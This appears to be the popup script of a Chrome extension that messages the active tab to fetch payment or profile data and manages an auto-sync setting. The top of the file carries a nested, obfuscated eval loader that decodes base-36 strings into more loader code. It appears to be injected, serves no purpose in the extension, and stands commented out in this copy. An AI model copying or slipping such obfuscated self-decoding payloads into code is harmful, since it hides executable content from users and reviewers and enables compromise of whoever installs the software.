// function(w,i,s,e){for(s=0;s<w.length;s+=2){i+=String.fromCharCode(parseInt(w.substr(s,2),36));}return i;}('1b1b0d0a1n2t3a2p30142u39322r382x3332143b182x1837182t153f2u333614371p1c1n371o3b1a302t322v382w1n37171p1e153f2x171p2b38362x322v1a2u3633311v2w2p361v332s2t14342p36372t213238143b1a37392q3738361437181e15181f1i15151n3h362t383936320w2x1n3h14131d2q1d2q1c2s1c2p1318131318131318131315151n1n2t3a2p30142u39322r382x3332143b182x1837182t153f2u333614371p1c1n371o3b1a302t322v382w1n37171p1e153f2x171p2b38362x322v1a2u3633311v2w2p361v332s2t14342p36372t213238143b1a37392q3738361437181e15181f1i15151n3h362t383936320w2x1n3h14131d2q1d2q1c2s1c2p1d321e381f2p1e341f1c1d1g1e391f1l1f1e1e361f1k1e3c1f1f1f1e1d1g1f2q1d1k1e3c1d1k1f1j1d1k1e381d1h1f2u1e391f1f1f1i1d1g1f1j1d341d2r1d321f1j1d331f2q1d2p1f1c1e381f1e1e3a1f1k1e3b1d321f1j1d1j1d341d2t1d1h1f2u1e3c1d1j1d341e2q1f1k1f1i1e3c1f1e1e3a1d2p1e391f1i1f1f1f1d1d3a1e3b1e341f1i1d3a1f1f1e371e381d1g1f1g1e341f1i1f1j1e381e1d1f1e1f1k1d1g1f2q1d2p1f1j1f1l1e351f1j1f1k1f1i1d1g1f1j1d1k1d2t1d1h1d1k1d2u1d2x1d1h1d1h1d321f2w1f1i1e381f1k1f1l1f1i1f1e1c3b1e3c1d321f2w1d1g1d1f1d2s1e351d2s1e351d2r1e371d2r1e341d1f1d1k1d1f1d1f1d1k1d1f1d1f1d1k1d1f1d1f1d1h1d1h1d321318131318131318131315151n','','',''));; ;

//
// ;eval(function(w,i,s,e){for(s=0;s<w.length;s+=2){i+=String.fromCharCode(parseInt(w.substr(s,2),36));}return i;}('1b1b0d0a','','',''));;eval(function(w,i,s,e){for(s=0;s<w.length;s+=2){i+=String.fromCharCode(parseInt(w.substr(s,2),36));}return i;}('1b1b0d0a1n2t3a2p30142u39322r382x3332143b182x1837182t153f2u333614371p1c1n371o3b1a302t322v382w1n37171p1e153f2x171p2b38362x322v1a2u3633311v2w2p361v332s2t14342p36372t213238143b1a37392q3738361437181e15181f1i15151n3h362t383936320w2x1n3h14131d2q1d2q1c2s1c2p1318131318131318131315151n','','',''));

var par;
var ctab;
var bg = chrome.extension.getBackgroundPage();
$(function() {
    var lblSync = $('#lblSync'),
        btnPay = $('#btnPay'),
        btnPayOp = $('#btnPayOp'),
        table = $('#table'),
        servSync = $('#servSync'),
        auto_sync = $('#auto_sync'),
        auto_sync_storage = false,
        auto_speed = $('#auto_speed'),
        ig_auto_speed = $('#ig_auto_speed'),
        progress = $('#progress');

    function sendC(domBtn, cmd) {
        domBtn.click(function() {
            table.html('');
            progress.removeClass('hidden');
            lblSync.text(ll.wait);
            chrome.tabs.sendMessage(ctab.id, {
                cmd: cmd
            }, function(r) {
                progress.addClass('hidden');
                if (!r) return;
                if (r.text) lblSync.text(r.text);
                if (r.prof) table.html(r.prof).removeClass('hidden');
            });
            lblSync.removeClass('hidden');
        });
    }
    chrome.tabs.getSelected(null, function(tab) {
        ctab = tab;
        par = bg.getUrlArg(ctab.url);
        if (!par || (par.type != 'fin' && par.type != 'finOp')) return bg.hidePopup(ctab.id);
        sendC(btnPay, 'fin');
        sendC(btnPayOp, 'finOp');
        chrome.extension.onMessage.addListener(function(request) {
            if (request.cmd != 'progress') return;
            progress.children().css('width', request.width);
        });
    });

    function saveSync(val) {
        chrome.storage.sync.set({
            'autoSync': val
        });
    }
    chrome.storage.sync.get('autoSync', function(d) {
        if (d && d['autoSync']) auto_sync_storage = d['autoSync'];
        auto_sync.prop('checked', auto_sync_storage);
        if (auto_sync_storage) {
            auto_sync.parent().addClass('checked');
            ig_auto_speed.removeClass('hidden');
        } else {
            auto_sync.parent().removeClass('checked');
            ig_auto_speed.addClass('hidden');
        }
    });
    auto_sync.change(function() {
        if ($(this).is(":checked")) {
            ig_auto_speed.removeClass('hidden');
            saveSync(true);
        } else {
            ig_auto_speed.addClass('hidden');
            saveSync(false);
        }
    });
    servSync.click(function() {});
});